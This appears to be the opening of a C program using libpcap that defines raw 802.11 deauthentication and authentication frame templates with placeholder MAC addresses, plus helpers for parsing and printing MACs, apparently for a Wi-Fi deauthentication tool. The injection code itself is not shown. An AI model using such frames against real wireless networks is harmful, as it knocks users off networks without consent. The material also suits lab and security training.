#include <pcap.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#define DEAUTH_REQ                                                             \
       	"\x00\x00\x0d\x00\x04\x80\x02\x00\x02\x00\x01\x00\x00\xC0\x00\x3A"      \
       	"\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB"      \
      	"\xBB\xBB\xBB\x00\x00\x07\x00"
#define AUTH_REQ                                                               \
	"\x00\x00\x0d\x00\x04\x80\x02\x00\x02\x00\x01\x00\x00\xB0\x00\x3A"	\
	"\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB"	\
	"\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"
/*
#define AUTH_REQ                                                               \
     "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
     "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"
*/
struct Mac{
    u_int8_t mac[6];
};
struct Para{
  struct Mac ap;
  struct Mac sta;
  int pbit[2];
};
u_int8_t ctoi(char argv){
    if(argv >=48 && argv<=57){// 0~9
        return argv -'0';
    }else if(argv>=65 && argv<=90){// A~Z
        return argv -'A' + 10;
    }else if(argv>=97 && argv<=122){//a~z
        return argv -'a' + 10;
    }
    return 0;
}
void printMac(struct Mac* buf){
    printf("Mac = ");
    for(int i=0;i<6;i++)
    {
        printf("%.2X",buf->mac[i]);
    }
    printf("\n");
}
void putMac(struct Mac* buf, char* argv){
    
    for(int i=0; i<6;i++)
    {
        buf->mac[i] |= ctoi(argv[i*3])<<4 & 0xF0;
        buf->mac[i] |= ctoi(argv[i*3+1]) & 0x0F;
    }
}

